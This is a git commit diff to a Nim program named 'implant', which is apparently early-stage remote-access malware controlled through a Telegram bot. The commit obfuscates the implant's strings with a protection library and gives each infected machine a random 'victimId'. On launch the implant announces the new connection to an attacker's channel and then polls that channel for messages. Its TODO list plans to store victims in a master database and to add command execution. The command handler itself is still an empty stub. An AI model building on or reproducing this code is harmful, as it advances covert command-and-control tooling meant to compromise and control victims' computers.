4990e609689def84d50abd085163852da405237b
MowlandCodes <mowlandgaming@gmail.com>
2025-07-29 00:06:17 +0700

    edit: some changes, and some protection for the implant

--- implant/implant.nim
+++ implant/implant.nim
@@ -1,30 +1,50 @@
-import std/[strutils, os, osproc, strformat, asyncdispatch]
+import std/[strutils, sequtils, os, osproc, asyncdispatch]
 import telebot
 import dotenv
+import nimprotect
+import nanoid
 
-let
-    env_path: string = &"{getCurrentDir()}/../"
-
-load(env_path)
-
-let API_KEY: string = strip(getEnv("ALPHA_BOT_TOKEN"))
-var victimId: string
 
 #[ TODO List
 
-1. Automaticaly receive new ID from Master Bot
+1. Automaticaly get new ID on each new Connection ✅
+2. Save the ID to the Master Database using the Master Bot
+3. Add handler for command execution
 
 ]#
 
-proc updateHandler(bot: TeleBot, update: Update): Future[bool] {.async.} =
+var env_path: string = getCurrentDir()
+env_path.add(protectString("/../"))
+
+load(env_path)
+
+let API_KEY: string = strip(getEnv(protectString("ALPHA_BOT_TOKEN")))
+let victimId: string = generate(protectString("abcdefABCDEF1234567890"), size = 16)
+let chanId: string = strip(getEnv(protectString("CHANNEL_ID")))
+
+proc commandHandler(cmd: seq[string]) =
+    discard
+
+proc messageHandler(bot: TeleBot, update: Update): Future[bool] {.async.} =
+    var message: string
+
     # Only handle channel posts
-    if not update.channelPost.isNil():
-        let message: string = update.channelPost.text
-    return true
+    if not update.channelPost.isNil() and not update.channelPost.text.isNil():
+        message = update.channelPost.text
+
+    if message.len <= 1:
+        return false
+    else:
+        echo(protectString("Received message: ") & message)
+        discard await bot.sendMessage(update.channelPost.chat.id,
+                protectString("Message received: ") & message)
+        return true
 
 when isMainModule:
     # Initialize the TeleBot
     let bot = newTeleBot(API_KEY)
 
-    bot.onUpdate(updateHandler)
+    discard bot.sendMessage(chanId, protectString("*Connection*: ") & victimId,
+            parseMode = protectString("Markdown")) # Indicate a new Connection
+    bot.onUpdate(messageHandler)
     bot.poll(offset = -1, limit = 1)
